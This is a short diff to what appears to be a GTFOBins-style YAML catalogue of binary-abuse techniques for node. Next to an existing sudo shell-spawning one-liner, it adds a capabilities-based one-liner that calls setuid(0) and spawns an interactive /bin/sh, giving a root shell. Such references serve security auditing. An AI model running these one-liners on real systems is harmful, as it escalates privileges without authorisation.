@@ -30,4 +30,7 @@ functions:
   sudo-enabled:
     - code: |
         sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
+  capabilities-enabled:
+    - code: |
+        ./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
 ---
